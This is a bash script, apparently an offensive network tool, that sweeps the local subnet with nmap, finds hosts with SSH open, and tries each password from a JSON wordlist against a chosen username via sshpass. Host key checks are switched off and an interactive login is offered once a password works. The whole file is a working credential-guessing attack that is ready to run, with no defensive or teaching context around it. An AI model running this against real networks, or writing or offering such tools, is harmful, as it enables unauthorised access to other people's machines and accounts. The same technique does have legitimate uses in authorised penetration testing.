#!/usr/bin/env bash

TIMEOUT=10
PASSFILE="passwords.json"

if [[ -z "$1" ]]; then
  echo "Usage: $0 <username>"
  exit 1
fi

USER="$1"

if [[ ! -f "$PASSFILE" ]]; then
  echo "[!] Password file $PASSFILE not found"
  exit 1
fi

PASSWORDS=$(jq -r '.passwords[]' "$PASSFILE" 2>/dev/null)

if [[ -z "$PASSWORDS" ]]; then
  echo "[!] No passwords found in JSON"
  exit 1
fi

echo "[*] Username: $USER"
echo "[*] Detecting local subnet..."

SUBNET=$(ip -4 addr show scope global | awk '/inet / {print $2; exit}')

if [[ -z "$SUBNET" ]]; then
  echo "[!] Could not detect subnet"
  exit 1
fi

echo "[*] Subnet: $SUBNET"
echo "[*] Scanning for live hosts..."

LIVE_HOSTS=$(sudo nmap -sn "$SUBNET" | awk '/Nmap scan report for/ {print $NF}')

if [[ -z "$LIVE_HOSTS" ]]; then
  echo "[!] No live hosts found"
  exit 1
fi

for IP in $LIVE_HOSTS; do
  echo "▶ Probing $IP"

  nc -z -w 2 "$IP" 22 2>/dev/null || {
    echo "  ✖ SSH not open"
    echo
    continue
  }

  echo "  ✔ SSH open"

  for PASS in $PASSWORDS; do
    echo "    ▶ Trying password: ****"

    sshpass -p "$PASS" ssh \
      -o ConnectTimeout=$TIMEOUT \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      "$USER@$IP" "echo AUTH_OK" \
      2>/dev/null | grep -q AUTH_OK

    if [[ $? -eq 0 ]]; then
      echo "    ✔ Credentials valid for $USER@$IP"

      read -rp "    Connect now? (y/N): " ANSWER
      if [[ "$ANSWER" =~ ^[Yy]$ ]]; then
        echo "▶ Connecting to $IP..."
        ssh "$USER@$IP"
        exit 0
      else
        echo "    ↪ Skipping connection, continuing scan"
        break
      fi
    fi
  done

  echo
done

echo "❌ Scan completed. No active sessions opened."
exit 1
